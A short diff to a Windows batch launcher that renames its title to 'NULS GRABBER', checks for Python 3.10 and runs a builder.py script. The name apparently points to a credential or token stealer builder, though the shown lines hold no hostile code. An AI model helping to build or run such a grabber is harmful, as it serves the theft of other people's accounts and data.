@@ -1,12 +1,12 @@
 @echo off
 mode con: cols=100 lines=30
-title good
+title NULS GRABBER
 color 0a
 cls
 
 python --version 2>&1 | findstr " 3.11" >nul
 if %errorlevel% == 0 (
-    echo python 3.11.x and up are not supported by good. Please downgrade to python 3.10.x.
+    echo python 3.11.x and up are not supported by nuls. Please downgrade to python 3.10.x.
     pause
     exit
 )
@@ -28,3 +28,4 @@ if exist build rmdir /s /q build
 py -3.10 builder.py
 
 pause
+
